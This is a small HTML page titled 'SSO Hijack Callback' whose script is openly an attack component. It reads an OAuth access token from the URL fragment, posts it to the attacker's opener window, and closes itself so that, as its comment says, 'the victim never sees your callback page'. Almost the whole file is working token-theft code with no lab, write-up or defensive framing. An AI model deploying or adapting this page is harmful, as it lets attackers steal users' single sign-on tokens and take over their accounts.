<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>SSO Hijack Callback</title>
</head>
<body>
  <p>Processing…</p>
  <script>
    // 1) Pull the access_token out of the URL fragment
    const params = new URLSearchParams(location.hash.slice(1));
    const token  = params.get('access_token');
    if (!token) {
      document.body.textContent = '⚠️ No token found.';
    } else {
      // 2) Send it back to the opener (parent) via postMessage
      window.opener.postMessage(
        { type: 'got_token', token },
        window.origin
      );
      // 3) Close the popup so the victim never sees your callback page
      window.close();
    }
  </script>
</body>
</html>
